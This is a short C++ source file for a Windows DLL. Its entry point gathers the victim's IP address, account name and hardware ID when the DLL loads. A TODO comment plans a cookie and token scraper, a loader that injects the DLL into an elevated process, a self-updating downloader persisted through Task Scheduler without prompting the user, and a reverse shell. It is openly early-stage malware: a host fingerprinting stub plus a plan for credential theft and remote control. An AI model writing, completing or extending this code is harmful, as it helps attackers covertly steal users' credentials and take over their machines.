#include <Windows.h>
#include "Server/Server.h"
#include <Fetch/Fetch.h>

/*TO DO : Establish a connection from client to server and make a cookie / token scraper
 Make our loader that will load this dll into an elevated process and also download a new 
 version of the loader schedule it in task manager to boot up without prompting user that way we wont ever have issues and finally need to make a reverse shell*/
BOOL APIENTRY Entry(
	HMODULE h_module,
	DWORD ul_reason_for_call,
	LPVOID lp_reserved
)
{
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:

		Fetch fetch;
		fetch.network().ip();
		fetch.user().get_account_name();
		fetch.hardware().id();

		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}

	return TRUE;
}
